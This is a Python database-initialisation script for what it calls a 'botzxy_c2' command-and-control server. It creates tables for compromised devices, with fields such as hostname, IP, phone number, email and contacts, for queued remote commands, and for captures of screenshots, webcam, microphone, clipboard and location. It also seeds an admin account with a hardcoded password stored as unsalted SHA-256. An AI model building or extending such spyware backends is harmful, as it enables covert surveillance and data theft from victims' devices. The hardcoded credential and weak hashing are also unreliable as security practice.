# init_db.py
import sqlite3
import os
import hashlib

DB_PATH = 'database/botzxy_c2.db'

def init_db():
    try:
        os.makedirs('database', exist_ok=True)
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                api_key TEXT UNIQUE NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Devices table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT UNIQUE NOT NULL,
                user_id INTEGER REFERENCES users(id),
                platform TEXT,
                hostname TEXT,
                ip TEXT,
                country TEXT,
                os_version TEXT,
                is_online BOOLEAN DEFAULT 1,
                last_seen TIMESTAMP,
                registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                memory_info TEXT,
                storage_info TEXT,
                camera_count INTEGER DEFAULT 0,
                has_microphone BOOLEAN DEFAULT 0,
                phone_number TEXT,
                email TEXT,
                contacts TEXT,
                bot_name TEXT DEFAULT 'BotZXY'
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT REFERENCES devices(device_id),
                command TEXT NOT NULL,
                params TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                executed_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Captures table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT REFERENCES devices(device_id),
                type TEXT CHECK(type IN ('screenshot', 'webcam', 'mic', 'clipboard', 'location')),
                data TEXT,
                file_path TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                action TEXT,
                details TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        print("[+] Database tables created successfully")
        
        # Crea utente admin
        admin = cursor.execute('SELECT * FROM users WHERE username = "admin"').fetchone()
        if not admin:
            password_hash = hashlib.sha256('BotZXY2026!'.encode()).hexdigest()
            api_key = hashlib.sha256(os.urandom(32)).hexdigest()
            cursor.execute('''
                INSERT INTO users (username, password_hash, api_key)
                VALUES (?, ?, ?)
            ''', ('admin', password_hash, api_key))
            conn.commit()
            print('[+] Admin user created: admin / BotZXY2026!')
        
        conn.close()
        return True
    except Exception as e:
        print(f"[-] Database init error: {e}")
        return False

if __name__ == '__main__':
    init_db()